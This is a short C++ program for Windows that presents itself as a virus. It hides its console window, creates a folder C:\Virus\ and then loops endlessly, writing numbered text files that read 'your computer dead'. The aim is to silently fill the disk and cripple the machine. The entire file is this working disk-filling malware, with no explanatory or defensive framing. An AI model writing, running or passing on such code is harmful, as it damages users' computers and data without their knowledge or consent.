#include <iostream>
#include <fstream>
#include <string>
#include <direct.h>
#include <Windows.h>

using namespace std;

int main()
{
    FreeConsole();
    int h = 0;

    const char *path = "C:\\Virus\\";

    string str = "your computer dead";

    auto res=  _mkdir(path);

    while (true)
    {
        ++h;
        ofstream Virus;
        Virus.open(path + to_string(h) + ".txt", ios_base::out);
        Virus << str;
        Virus.close();
    }
    return 0;
}